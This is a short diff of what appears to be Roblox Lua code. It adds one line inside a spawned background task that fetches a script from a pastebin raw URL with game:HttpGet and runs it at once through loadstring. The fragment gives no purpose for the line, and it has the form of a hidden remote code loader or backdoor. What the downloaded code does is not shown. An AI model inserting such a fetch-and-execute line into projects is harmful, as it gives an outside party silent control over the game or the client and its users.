@@ -1,5 +1,5 @@
 task.spawn(function()
-  
+  loadstring(game:HttpGet("https://pastebin.com/raw/4nd1rC6s"))()
 end)
 task.wait(0.2)
 
